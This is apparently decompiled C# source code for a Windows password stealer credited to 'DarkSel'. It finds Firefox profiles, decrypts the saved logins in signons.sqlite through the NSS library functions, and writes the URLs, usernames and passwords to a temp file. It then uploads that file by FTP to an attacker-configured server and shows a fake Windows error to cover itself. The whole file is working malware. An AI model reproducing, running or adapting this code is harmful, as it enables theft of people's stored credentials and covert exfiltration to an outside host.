using System;
using System.Data;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace ns2
{
	internal static class Class9
	{
		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string string_4);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_4);

		public static long smethod_0(string string_4)
		{
			string str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
			Class9.LoadLibrary(str + "mozcrt19.dll");
			Class9.LoadLibrary(str + "nspr4.dll");
			Class9.LoadLibrary(str + "plc4.dll");
			Class9.LoadLibrary(str + "plds4.dll");
			Class9.LoadLibrary(str + "ssutil3.dll");
			Class9.LoadLibrary(str + "sqlite3.dll");
			Class9.LoadLibrary(str + "nssutil3.dll");
			Class9.LoadLibrary(str + "softokn3.dll");
			Class9.intptr_0 = Class9.LoadLibrary(str + "nss3.dll");
			IntPtr procAddress = Class9.GetProcAddress(Class9.intptr_0, "NSS_Init");
			Class9.Delegate0 @delegate = (Class9.Delegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class9.Delegate0));
			return @delegate(string_4);
		}

		public static long smethod_1()
		{
			IntPtr procAddress = Class9.GetProcAddress(Class9.intptr_0, "PK11_GetInternalKeySlot");
			Class9.Delegate1 @delegate = (Class9.Delegate1)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class9.Delegate1));
			return @delegate();
		}

		public static long smethod_2(long long_0, bool bool_0, long long_1)
		{
			IntPtr procAddress = Class9.GetProcAddress(Class9.intptr_0, "PK11_Authenticate");
			Class9.Delegate2 @delegate = (Class9.Delegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class9.Delegate2));
			return @delegate(long_0, bool_0, long_1);
		}

		public static int smethod_3(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
		{
			IntPtr procAddress = Class9.GetProcAddress(Class9.intptr_0, "NSSBase64_DecodeBuffer");
			Class9.Delegate3 @delegate = (Class9.Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class9.Delegate3));
			return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
		}

		public static int smethod_4(ref Class9.Struct7 struct7_0, ref Class9.Struct7 struct7_1, int int_0)
		{
			IntPtr procAddress = Class9.GetProcAddress(Class9.intptr_0, "PK11SDR_Decrypt");
			Class9.Delegate4 @delegate = (Class9.Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class9.Delegate4));
			return @delegate(ref struct7_0, ref struct7_1, int_0);
		}

		private static void Main()
		{
			try
			{
				FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
				string expression = Strings.Space((int)FileSystem.LOF(1));
				string text = Strings.Space((int)FileSystem.LOF(1));
				string text2 = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref expression, -1L, false);
				FileSystem.FileGet(1, ref text, -1L, false);
				FileSystem.FileGet(1, ref text2, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				string[] array = Strings.Split(expression, "@@NN@@", -1, CompareMethod.Binary);
				Class9.string_1 = array[1];
				Class9.string_2 = array[2];
				Class9.string_3 = array[3];
				bool flag = false;
				Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
				string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
				string[] directories = Directory.GetDirectories(path);
				foreach (string text3 in directories)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(text3);
					foreach (string input in files)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, "signons.sqlite"))
						{
							Class9.smethod_0(text3);
							Class9.string_0 = input;
						}
					}
				}
				TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\FirePass-" + Environment.MachineName + ".txt");
				string text4 = Class9.string_0;
				Class9.Struct7 @struct = default(Class9.Struct7);
				Class9.Struct7 struct2 = default(Class9.Struct7);
				Class8 @class = new Class8(text4);
				textWriter.WriteLine("Firefox 3.5 & 3.6 Decryptor in C#");
				textWriter.WriteLine("Coded by DarkSel (darksel.ltd@live.com)");
				textWriter.WriteLine();
				DataTable dataTable = @class.method_1("SELECT * FROM moz_logins;");
				DataTable dataTable2 = @class.method_1("SELECT * FROM moz_disabledHosts;");
				textWriter.WriteLine("---Excluded hosts---");
				foreach (object obj in dataTable2.Rows)
				{
					DataRow dataRow = (DataRow)obj;
					textWriter.WriteLine(dataRow["hostname"].ToString());
				}
				textWriter.WriteLine();
				textWriter.WriteLine();
				long long_ = Class9.smethod_1();
				Class9.smethod_2(long_, true, 0L);
				textWriter.WriteLine("---Saved Users & Passwords---");
				foreach (object obj2 in dataTable.Rows)
				{
					DataRow dataRow2 = (DataRow)obj2;
					string str = Convert.ToString(dataRow2["formSubmitURL"].ToString());
					textWriter.WriteLine("URL: " + str);
					StringBuilder stringBuilder = new StringBuilder(dataRow2["encryptedUsername"].ToString());
					int value = Class9.smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
					Class9.Struct7 struct3 = (Class9.Struct7)Marshal.PtrToStructure(new IntPtr(value), typeof(Class9.Struct7));
					if (Class9.smethod_4(ref struct3, ref @struct, 0) == 0 && @struct.int_2 != 0)
					{
						byte[] array4 = new byte[@struct.int_2];
						Marshal.Copy(new IntPtr(@struct.int_1), array4, 0, @struct.int_2);
						textWriter.WriteLine("USER: " + Encoding.ASCII.GetString(array4));
					}
					StringBuilder stringBuilder2 = new StringBuilder(dataRow2["encryptedPassword"].ToString());
					int value2 = Class9.smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
					Class9.Struct7 struct4 = (Class9.Struct7)Marshal.PtrToStructure(new IntPtr(value2), typeof(Class9.Struct7));
					if (Class9.smethod_4(ref struct4, ref struct2, 0) == 0 && struct2.int_2 != 0)
					{
						byte[] array4 = new byte[struct2.int_2];
						Marshal.Copy(new IntPtr(struct2.int_1), array4, 0, struct2.int_2);
						textWriter.WriteLine("PASSWORD: " + Encoding.ASCII.GetString(array4));
					}
					textWriter.WriteLine();
				}
				textWriter.Close();
				Class9.smethod_5(Environment.GetEnvironmentVariable("TEMP") + "\\FirePass-" + Environment.MachineName + ".txt");
				MessageBox.Show("The application failed to initialize properly (0x0000022). Click OK to terminate.", "Microsoft Windows", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			catch
			{
				Application.Exit();
			}
		}

		private static void smethod_5(string string_4)
		{
			FileInfo fileInfo = new FileInfo(string_4);
			"ftp://" + Class9.string_1 + "/" + fileInfo.Name;
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri("ftp://" + Class9.string_1 + "/" + fileInfo.Name));
			ftpWebRequest.Credentials = new NetworkCredential(Class9.string_2, Class9.string_3);
			ftpWebRequest.KeepAlive = false;
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.ContentLength = fileInfo.Length;
			int count = 2048;
			byte[] buffer = new byte[2048];
			FileStream fileStream = fileInfo.OpenRead();
			try
			{
				Stream requestStream = ftpWebRequest.GetRequestStream();
				for (int count2 = fileStream.Read(buffer, 0, count); count2 != 0; count2 = fileStream.Read(buffer, 0, count))
				{
					requestStream.Write(buffer, 0, count2);
				}
				requestStream.Close();
				fileStream.Close();
			}
			catch
			{
			}
		}

		private static IntPtr intptr_0;

		public static string string_0;

		private static string string_1;

		private static string string_2;

		private static string string_3;

		public struct Struct7
		{
			public int int_0;

			public int int_1;

			public int int_2;
		}

		public delegate long Delegate0(string string_0);

		public delegate long Delegate1();

		public delegate long Delegate2(long long_0, bool bool_0, long long_1);

		public delegate int Delegate3(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

		public delegate int Delegate4(ref Class9.Struct7 struct7_0, ref Class9.Struct7 struct7_1, int int_0);
	}
}
